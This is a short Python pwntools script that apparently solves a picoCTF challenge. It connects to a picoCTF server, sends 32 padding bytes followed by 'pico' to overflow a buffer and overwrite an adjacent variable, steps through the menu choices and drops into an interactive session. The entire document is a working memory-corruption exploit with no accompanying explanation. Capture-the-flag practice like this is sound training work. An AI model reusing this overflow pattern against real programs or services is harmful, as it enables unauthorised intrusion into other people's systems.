from pwn import *

p = remote('tethys.picoctf.net',58312)

sla = p.sendlineafter

buff = b"A" * 32
ovrwrt_safe_var = b"pico"

pay = buff + ovrwrt_safe_var

def exp():
    sla(b"choice: ", b"2")
    sla(b": ", pay)
    sla(b": ", b"1")
    sla(b": ", b"4")

exp()

p.interactive()
